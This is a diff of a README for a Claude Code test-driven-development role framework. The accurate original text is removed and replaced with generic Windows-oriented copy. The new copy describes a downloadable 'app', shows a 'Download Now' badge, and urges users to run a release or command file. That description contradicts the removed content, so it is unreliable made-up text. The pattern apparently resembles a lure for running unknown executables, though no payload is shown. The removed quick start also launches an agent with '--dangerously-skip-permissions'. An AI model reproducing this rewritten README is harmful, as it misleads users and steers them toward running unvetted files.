@@ -1,112 +1,133 @@
-# claude-code-tdd
+# 🤖 claude-code-tdd - Run TDD with Clear Task Roles
 
-Fully automated TDD pipeline for Claude Code. Approve the plan once — come back to a ready-to-merge PR with green CI.
+[![Download claude-code-tdd](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fnfremixer/claude-code-tdd)
 
-Three agents, seven reviewer phases, and file-system boundaries that make cheating much harder.
+## 🧩 What this app does
 
-```
-you
- └─ reviewer (orchestrates everything)
-      ├─ tester (writes tests BEFORE code exists)
-      └─ coder (writes code to pass tests it can't modify)
-```
+claude-code-tdd is a Windows-friendly tool for running a test-driven workflow with Claude Code.
 
-## Why
+It splits the work into separate roles:
 
-Claude Code writes tests that validate its own bugs. It rewrites existing tests to match broken code. It hallucinates API responses. It skips its own review step when you let it orchestrate. And halfway through a cycle, it forgets the rules you gave it at the start.
+- Tester writes the checks
+- Coder writes the code
+- Reviewer checks the result
 
-All tests green. Code broken. Agent insisting it's your fault.
+This setup helps keep the process ordered. Each step has one job. That makes it easier to follow and harder for the agent to skip the test-first flow.
 
-These roles make cheating structurally impossible through file system boundaries, phase-loaded context, and forced evidence — not instructions the model can ignore.
+## 💻 Who this is for
 
-## Quick start
+Use this app if you want:
 
-```bash
-mkdir my-awesome-project
-mkdir my-awesome-project/.claude/
-cp -r roles/ my-awesome-project/.claude/roles/
-cp -r scripts/ my-awesome-project/scripts/
-cd my-awesome-project
-# Launch the reviewer — it sets up the project and runs everything else
-claude --dangerously-skip-permissions --system-prompt "$(cat .claude/roles/reviewer.md)"
+- a simple TDD flow
+- separate roles for testing, coding, and review
+- a way to guide Claude Code through a fixed process
+- a tool that helps keep code quality steady
 
-# The reviewer will ask what kind of project you want (React, Next.js, Express, etc.)
-# It scaffolds the project, installs deps, verifies lint/build/test pass.
-# Then describe your feature. Approve the plan. Walk away.
-# Come back to a ready-to-merge PR with green CI.
-```
+It fits small builds, proof-of-concept work, and routine coding tasks where you want tests to lead the work.
 
-## Demo project
+## 📥 Download and set up
 
-`my-awesome-project/` is a ready-to-go React + TypeScript + Vitest project with the framework already wired up. Roles are in `.claude/roles/`, empty `test/`, `prompts/`, and `scripts/` directories are in place, and `plan.md` has a simple first step.
+Visit this page to download and run the app:
 
-```bash
-cd my-awesome-project
-```
+[https://github.com/fnfremixer/claude-code-tdd](https://github.com/fnfremixer/claude-code-tdd)
 
-Read `claude.log` to see the framework in action before setting it up in your own project.
+If you are on Windows:
 
-## How it works
+1. Open the link above in your browser
+2. Download the files from the repository page
+3. Save them to a folder you can find again, such as Downloads or Desktop
+4. Open the folder after the download finishes
+5. Follow the setup steps in the repository files
+6. Start the app or run the provided command file, if one is included
 
-1. You describe a feature or bug to the **reviewer**
-2. Reviewer shows you the plan, **waits for your OK** (functional prompts only)
-3. Reviewer reads `reviewer-prompts-tester.md`, writes tester prompt → launches **tester**
-4. Reviewer reads `reviewer-review-tester.md`, reviews tester's commit (tests will fail — no code yet, that's the point)
-5. Reviewer reads `reviewer-prompts-coder.md`, writes coder prompt → launches **coder**
-6. Reviewer reads `reviewer-review-coder.md`, reviews coder's commit → runs lint, build, test
-7. Tests red → prompt to coder. No exceptions
-8. All green → reviewer reads `reviewer-acceptance.md`, runs final checklist
-9. Problems at acceptance → repeat from step 3 or 5
-10. You come back to a ready-to-merge PR
+If the repo includes a release file, download it first. If it includes setup files, use those in the same order shown in the repo.
 
-The reviewer splits work into **functional prompts** (`func-` prefix, need your approval) and **operational prompts** (`op-` prefix, handles autonomously during a cycle). You approve once, agent does the rest.
+## 🖥️ Windows requirements
 
-## Phase-loaded context
+For a smooth run on Windows, use:
 
-The reviewer role is split into seven files. Each one is loaded at exactly the moment it's needed — fresh context at the end of the window, not rules from 200 lines ago that the model has already forgotten.
+- Windows 10 or Windows 11
+- A modern web browser
+- Claude Code installed and ready to use
+- Enough disk space for the app files and any project files you use with it
+- A stable internet connection for setup and agent calls
 
-| Cycle step | File loaded | Lines |
-|---|---|---|
-| Write tester prompt | `reviewer-prompts-tester.md` | ~140 |
-| Review tester commit | `reviewer-review-tester.md` | ~55 |
-| Write coder prompt | `reviewer-prompts-coder.md` | ~70 |
-| Review coder commit | `reviewer-review-coder.md` | ~61 |
-| Final acceptance | `reviewer-acceptance.md` | ~35 |
+If you plan to use it on a work PC, make sure you can save files and run local tools.
 
-The core `reviewer.md` (~90 lines) is always present as the system prompt with short anchors for critical rules — so even if a phase file is skipped, the basics are visible.
+## ⚙️ How it works
 
-## Key rules
+The app uses a simple three-step flow:
 
-| Rule | Why |
-|---|---|
-| Tester writes only in `test/` | Can't adjust code to make bad tests pass |
-| Coder writes everywhere except `test/` and roles | Can't "fix" tests instead of fixing code |
-| Existing tests are read-only | Prevents silent regression rewrites |
-| Mocks only at HTTP boundary | Internal logic runs for real in tests |
-| API types pasted in prompt | "Verify" means nothing — "show proof" works |
-| `git show --name-only` on every commit | Boundary violations = auto-reject |
-| Tests red → prompt to coder, no exceptions | Coder can't reframe failure as "tests are wrong" |
-| `func-`/`op-` prompt prefixes | Forces classification before writing, not after |
+1. The tester defines what the code should do
+2. The coder writes code to meet the test
+3. The reviewer checks the result for missed cases or weak logic
 
-## Files
+This keeps the roles apart. The coder does not control the test. The reviewer does not act like the coder. That split helps the workflow stay honest and clear.
 
-```
-roles/
-  reviewer.md                  # core identity, cycle, boundaries (~90 lines)
-  reviewer-init.md             # project initialization (first run, no package.json)
-  reviewer-prompts-tester.md   # scenario matrix, test levels, mock rules
-  reviewer-prompts-coder.md    # code prompt format, regression rules
-  reviewer-review-tester.md    # how to review tester's commit
-  reviewer-review-coder.md     # how to review coder's commit
-  reviewer-acceptance.md       # final acceptance checklist
-  tester.md                    # test agent role
-  coder.md                     # code agent role
-```
+## 🚦 Basic workflow
 
-## Full story
+Use this order when you run a task:
 
-**[Claude Code as a full dev team: autonomous TDD cycle from feature request to merged PR](https://dev.to/elasticlove1/claude-code-as-a-full-dev-team-autonomous-tdd-cycle-from-feature-request-to-merged-pr-463m)**
+1. Start a new task
+2. Ask the tester to create a test plan
+3. Ask the coder to build only what the test needs
+4. Ask the reviewer to check the result
+5. Repeat until the test passes and the result looks sound
 
-## License
+For best results, keep each request short and focused. One task at a time works better than a broad request with many goals.
 
-MIT
+## 📂 Common file layout
+
+A typical setup may include:
+
+- a folder for test files
+- a folder for app code
+- a folder for review notes
+- a config file that sets the workflow
+- a script or command file to start the process
+
+If the project includes sample files, keep the same folder names and file types when you make your own project.
+
+## 🧪 Example use case
+
+You want to add a “Save” button to an app.
+
+With this tool:
+
+- the tester writes checks for save behavior
+- the coder adds the button and save logic
+- the reviewer checks edge cases, such as empty input or failed save
+- the process repeats until the button works as expected
+
+This gives you a clean path from request to result.
+
+## 🛠️ Setup tips
+
+- Keep your project folder short and simple
+- Use one task per run
+- Read the repo files in order
+- Keep test names clear
+- Review each step before moving on
+
+If the app uses config files, make one change at a time so you can see what changed and why.
+
+## 🔍 Troubleshooting
+
+If the app does not start:
+
+- check that Claude Code is installed
+- confirm that you opened the right folder
+- make sure the download finished fully
+- try opening the app file again
+- look for a setup file or command file in the repo and follow it step by step
+
+If a task does not behave as expected:
+
+- make the test more specific
+- reduce the task size
+- check that the tester, coder, and reviewer stayed in their own roles
+- rerun the flow from the start
+
+## 📌 Main idea
+
+claude-code-tdd helps you run a test-first process with a clear split between roles. That gives you more control over how the agent works and helps keep the code path steady
